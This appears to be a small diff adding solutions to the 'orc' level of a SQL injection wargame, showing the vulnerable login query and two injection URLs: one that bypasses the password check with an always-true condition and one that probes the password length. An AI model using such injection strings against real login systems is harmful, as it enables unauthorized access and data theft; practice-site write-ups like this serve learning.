@@ -19,3 +19,6 @@ query : select id from prob_orc where id='admin' and pw=''
 
 $solutions
 
+https://los.rubiya.kr/chall/orc_{token}.php?pw='+or+(id='admin')--+1=0
+OR
+https://los.rubiya.kr/chall/orc_{token}.php?pw='or+length(pw)=8+--+1=2
